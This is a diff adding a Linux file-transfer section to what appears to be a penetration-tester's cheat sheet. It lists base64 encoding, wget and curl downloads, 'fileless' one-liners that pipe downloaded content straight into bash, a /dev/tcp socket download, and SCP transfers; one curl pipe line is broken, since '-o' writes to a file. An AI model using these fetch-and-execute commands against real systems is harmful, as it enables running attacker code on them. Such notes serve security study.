@@ -3,6 +3,62 @@
 [Harmj0y Powershell download cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
 
 ## Linux File Transfers
+### Base64 Encode/Decode
+```bash
+#Base64 Encode
+cat <file> |base64 -w 0;echo
+#Base64 Decode
+echo -n '<encoded data>' | base64 -d > <filename>
+```
+### Web Downloads
+wget
+```bash
+wget https://<URL> -O <filename>
+```
+curl
+```bash
+curl -o <filename> <URL>
+```
+### Fileless Attacks
+Can pipe directly to most interpreters, like ```bash``` or ```python```
+Curl
+```bash
+curl -o <filename> <URL> | bash
+```
+wget
+```bash
+wget -qO- <URL> | bash
+```
+### Download with Bash (/dev/tcp)
+Connect to the target
+```bash
+exec 3<>/dev/tcp/<IP>/<port>
+```
+Craft a GET request
+```bash
+echo -e "Get /<filename> HTTP/1.1\n\n">&3
+```
+Print the response
+```bash
+cat <&3
+```
+### SSH Downloads
+Enable the ssh server
+```bash
+sudo systemctl enable ssh
+```
+Start the ssh server
+```bash
+sudo systemctl start ssh
+```
+Check for SSH Listener
+```bash
+netstat -lnpt
+```
+Download via SCP
+```bash
+scp plaintext@<IP>:/<path>/<filename> .
+```
 ## Windows File Transfers
 ### PowerShell Base64 Encode/Decode
 ```powershell
